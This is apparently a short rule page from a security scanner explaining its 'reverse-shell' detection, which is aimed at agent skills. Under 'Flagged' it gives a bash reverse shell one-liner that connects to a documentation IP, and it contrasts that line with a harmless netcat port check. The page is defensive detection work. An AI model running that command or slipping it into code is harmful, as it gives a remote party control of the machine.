# reverse-shell

Severity: critical. OWASP Agentic Skills Top 10: AST01.

Opens a remote shell.

A shell is connected to a remote host so someone else can type commands on this machine.

## Flagged

```text
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
```

## Not flagged

```text
nc -z example.test 443   # a port check
```

## Why it matters

See https://attack.mitre.org/techniques/T1059/004/ and the OWASP Agentic Skills Top 10 (https://owasp.org/www-project-agentic-skills-top-10/).
